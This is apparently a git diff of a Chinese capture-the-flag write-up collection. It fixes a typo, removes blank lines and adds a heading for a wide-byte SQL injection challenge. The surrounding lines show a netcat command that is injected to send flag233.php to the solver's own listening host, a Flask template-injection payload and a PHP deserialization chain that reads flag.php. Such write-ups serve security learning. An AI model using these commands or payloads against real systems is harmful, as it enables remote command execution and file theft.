@@ -75,7 +75,7 @@ if(isset($_GET[sign])&& check($_GET[sign])){
 nc -lup 39999
 ~~~
 
-然后再题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php
+然后在题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php
 
 **注：这里我踩了个小坑，`cmd=nc`我输入成了 `cmd = nc`，等于号两边不能有空格。**
 
@@ -4675,7 +4675,6 @@ if __name__ == '__main__':
 + url_for() ---- 一般我们通过一个url即可执行到一个函数，如果知道一个函数，如何去获得url呢？url_for函数可以实现这个功能。url_for() 接收两个及两个以上的参数，以函数名作为第一个参数，后面的参数是url的命名规则
 + get_flashed_messages() ---- 返回之前在Flask中通过 flash() 传入的闪现信息列表在渲染模板时，不需要手动分配
 + 可以直接在 模板 中使用的 模板变量 及 函数：config、request、url_for()、get_flashed_messages()
-  
 
 ~~~
 /shrine/{{url_for.__globals__}}
@@ -4918,7 +4917,6 @@ https://blog.csdn.net/weixin_43952190/article/details/106016260
 + 如果\_\_toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的\_\_get()方法。
 + 如果\_\_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的\_\_invoke()方法。
 + 利用文件包含漏洞，使用_invoke()读取flag.php的内容。
-  
 
 payload:
 
@@ -6208,3 +6206,6 @@ if (isset($_POST['guess'])) {
 
 ![image-20210702134426127](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210702134426127.png)
 
+### [网鼎杯 2018]Comment
+
+宽字节注入
